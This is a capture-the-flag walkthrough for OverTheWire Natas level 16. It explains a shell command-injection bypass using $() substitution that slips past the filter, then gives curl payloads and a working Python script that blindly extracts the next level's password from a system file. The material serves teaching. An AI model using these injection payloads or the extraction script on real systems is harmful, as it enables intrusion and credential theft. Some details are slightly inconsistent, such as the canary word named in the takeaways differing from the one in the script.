> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas16.natas.labs.overthewire.org`                  |
| Username | `natas16`                                                    |
| Password | *found in [Natas Level 14 → 15](natas-level-14-level-15.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Python** — to automate blind extraction through grep output

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas16.natas.labs.overthewire.org` and log in with the password from Level 15.

The page presents a search box: **"Find words containing:"**. Submitting a term runs a grep against a dictionary and returns matching words. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Walking through the code:

```php
if(preg_match('/[;|&`\'"]/', $key)) {
    print "Input contains an illegal character!";
}
```

The regex blocks these characters: `;`, `|`, `&`, `` ` ``, `'`, `"`. This kills the most common command injection techniques:

- `;` and `&` — chaining commands
- `|` — piping output to another command
- `` ` `` — backtick subshell substitution
- `'` and `"` — breaking out of the surrounding string quotes

```php
passthru("grep -i \"$key\" dictionary.txt");
```

`passthru()` executes a shell command and prints the raw output directly to the response. The input is injected into the middle of the command, wrapped in double quotes: `grep -i "<input>" dictionary.txt`. The double quotes themselves are hardcoded in the PHP string and are not blockable via the filter.

---

### Understand What's Still Allowed

The filter blocks `'` but does **not** block `$()`, the other shell subshell syntax. Both `command` and `$(command)` execute a command and substitute its output inline. The filter only blocks one of them.

Inside double quotes in bash, `$()` still executes:

```bash
grep -i "$(cat /etc/passwd)" dictionary.txt
```

This runs `cat /etc/passwd`, substitutes the output into the grep pattern, and grep then searches the dictionary for lines matching that output. This is the injection primitive.

The characters `(`, `)`, `/`, and `$` are all unfiltered.

---

### Understand the Blind Channel

The password file is at `/etc/natas_webpass/natas17`. You cannot print it directly, `passthru` only outputs grep's results, and grep searches `dictionary.txt`, not the password file.

The indirect channel works like this: use `$(grep ...)` as the search pattern fed to the outer grep. The inner grep searches the password file; its output becomes the pattern for the outer grep searching the dictionary.

```bash
grep -i "$(grep ^a /etc/natas_webpass/natas17)" dictionary.txt
```

- The inner `grep ^a /etc/natas_webpass/natas17` checks whether the password starts with `a`. If it does, it returns the full password string. If not, it returns nothing.
- That result becomes the pattern for the outer `grep -i "<pattern>" dictionary.txt`.
- If the inner grep returned the password, the outer grep searches the dictionary for a word matching that password, which won't exist, so **no output**.
- If the inner grep returned nothing (empty string), the outer grep runs `grep -i "" dictionary.txt` — an empty pattern matches every line, so **all dictionary words are returned**.

The boolean signal is inverted compared to Level 15:

- **Output returned** → inner grep found nothing → the character tested is **not** a match
- **No output returned** → inner grep found the password → the character tested **is** a match

---

### Build the Payload

To check whether the password starts with `a`:

```
$(grep ^a /etc/natas_webpass/natas17)
```

Inserted into the shell command:

```bash
grep -i "$(grep ^a /etc/natas_webpass/natas17)" dictionary.txt
```

For character-by-character extraction, use the same `^` anchor approach as Level 15 but grow the known prefix:

- Position 1: `$(grep ^a /etc/natas_webpass/natas17)` → does password start with `a`?
- Position 2: `$(grep ^Wa /etc/natas_webpass/natas17)` → does password start with `Wa`?
- Position 3: `$(grep ^Waj /etc/natas_webpass/natas17)` → does password start with `Waj`?

Each confirmed prefix gets one character longer until all 32 are recovered.

Note: unlike Level 15, this approach is **case-sensitive by default** because `grep` without `-i` is case-sensitive. The outer grep uses `-i` but the inner grep does not so upper and lower case are distinguished automatically. No `BINARY` or `ORD()` equivalent needed.

---

### Step 3 — Confirm the Channel

Test with an empty subshell — `$()` with no command returns nothing, so the outer grep gets an empty pattern and returns the full dictionary:

```bash
curl -u natas16:<password> \
     "http://natas16.natas.labs.overthewire.org/index.php" \
     --data 'needle=$()'
```

Response: all dictionary words. The channel works.

Now test with a subshell that returns a string that definitely won't be in the dictionary:

```bash
curl -u natas16:<password> \
     "http://natas16.natas.labs.overthewire.org/index.php" \
     --data 'needle=$(grep ^a /etc/natas_webpass/natas17)'
```

If no output → password starts with `a`. If full dictionary → password does not start with `a`. Run this for each character of the charset until you find the first character, then extend the prefix.

---

### Step 4 — Automate the Extraction

The same length (32) and charset (a–z, A–Z, 0–9) as Level 15. The inverted boolean — no output means a hit — is handled in the script.

A cleaner signal check, searchs for a known word that will always appear when the pattern is empty vs. never when it's a real password string:

```python
import requests
from requests.auth import HTTPBasicAuth

url      = "http://natas16.natas.labs.overthewire.org/index.php"
auth     = HTTPBasicAuth("natas16", "<password>")
charset  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

# "African" appears in the dictionary, present in output when pattern is empty, absent when matched
CANARY   = "African"

for position in range(32):
    for char in charset:
        candidate = password + char
        payload   = f"$(grep ^{candidate} /etc/natas_webpass/natas17)"
        r         = requests.post(url, auth=auth, data={"needle": payload})
        if CANARY not in r.text:
            # Dictionary output is gone — inner grep returned the password — character confirmed
            password += char
            print(f"[{position+1:02d}] {char} → {password}")
            break

print(f"\nPassword: {password}")
```

|Variable|Purpose|
|---|---|
|`candidate`|The known prefix plus the current character being tested|
|`payload`|The `$()` subshell injected as the grep pattern|
|`CANARY`|A common dictionary word used to detect whether grep returned any results at all|
|`CANARY not in r.text`|True when no dictionary output came back — meaning the inner grep matched — confirming the character|

This approach is inherently slow because you're doing a **linear brute-force over 62 characters for each of 32 positions**: **`62 x 32 = 1984`**
That means up to ~2,000 HTTP requests to OTW, and each waits for a full page response.
Try coming up with a different approach.

```bash
python3 natas16.py
```

Output (abbreviated):

```
[01] W → W
[02] a → Wa
[03] j → Waj
...
[32] z → <password>
```

That is the password for [Natas Level 16 → 17](natas-level-16-level-17.md).

---

## Key Takeaways

- **Incomplete filter lists are bypassable.** Blocking `'`  but not `$()` leaves command substitution fully available. A filter must block every equivalent syntax, not just the most common one.
- **Grep itself is the exfiltration channel.** No direct output of the password is needed, the presence or absence of dictionary words in the response carries one bit of information per request, which is enough to extract arbitrary data character by character.
- **The boolean signal can be inverted.** In Level 15, a hit meant "exists." Here, a hit means "no output", the script logic flips accordingly. Recognising which direction the signal runs is essential before automating.
- **A canary word makes the signal reliable.** Checking for a known dictionary word (`"the"`) is more robust than counting lines or checking response length, which can vary with whitespace or HTML wrapping.

---